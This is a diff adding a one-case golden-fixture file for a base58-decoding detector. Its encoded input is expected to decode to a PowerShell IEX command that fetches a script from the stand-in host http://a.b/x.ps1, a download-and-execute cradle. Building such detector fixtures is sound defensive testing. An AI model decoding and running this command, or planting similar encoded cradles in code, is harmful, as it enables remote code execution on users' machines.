@@ -1,0 +1,2 @@
+# base58-decode · Golden Fixtures · RC3.2a
+{"case_id": "b58-plain-ps", "description": "Base58 (bitcoin alphabet) \u2192 PowerShell IEX", "input": "6b2S6MpBSN3P9VSXCv2cB3tQNbr7SUUGv3KrJEi1JaakeXzxFuYn3nq", "detect_min_confidence": 0.3, "expected_output_contains": ["powershell", "IEX", "http://a.b/x.ps1"]}
